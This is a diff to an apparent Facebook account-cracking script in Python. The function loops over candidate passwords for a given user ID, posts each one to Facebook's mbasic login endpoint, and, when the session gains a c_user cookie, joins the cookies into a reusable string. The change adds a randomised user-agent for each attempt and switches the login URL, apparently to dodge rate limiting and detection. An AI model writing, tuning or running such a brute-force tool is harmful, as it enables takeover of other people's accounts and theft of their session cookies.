@@ -1251,6 +1251,7 @@ def m5(idf,pwv):
  try:
   for ps in pwv:
    session = requests.Session()
+   ua = random.choice(usragent)
    free_fb = session.get('https://m.facebook.com').text
    log_data ={
              "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
@@ -1263,7 +1264,7 @@ def m5(idf,pwv):
             "pass":ps,
             "login":"Log In"}
    header_freefb = {
-    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36',
+    'User-Agent': ua,
     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
     'Accept-Language': 'en-US,en;q=0.9',
     'Accept-Encoding': 'gzip, deflate, br',
@@ -1274,11 +1275,11 @@ def m5(idf,pwv):
     'Sec-Fetch-User': '?1',
     'Sec-Fetch-Dest': 'document',
     'Cache-Control': 'max-age=0',
-    'Referer': 'https://m.facebook.com/',
-    'DNT': '1',  # Do Not Track
+    'Referer': 'https://mbasic.beta.facebook.com/',
+    'DNT': '1',
     'Pragma': 'no-cache',
     'TE': 'Trailers', }#'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36',}
-   lo = session.post('https://mbasic.beta.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Den_US%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%25221jt9n9yiqnynb1ik1fwn1dqe09f113zr4hslc6aw14cvw261ihv21p%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D86e59456-82f4-4a02-8b36-4db76c4584e6%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%25221jt9n9yiqnynb1ik1fwn1dqe09f113zr4hslc6aw14cvw261ihv21p%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%23_%3D_&display=page&locale=en_GB&pl_dbl=0',data=log_data,headers=header_freefb).text
+   lo = session.post('https://mbasic.beta.facebook.com/login/?li=OAlzZl3-THgItEozePI8qRZf&e=1348029&shbl=1&refsrc=deprecated&_rdr',data=log_data,headers=header_freefb).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
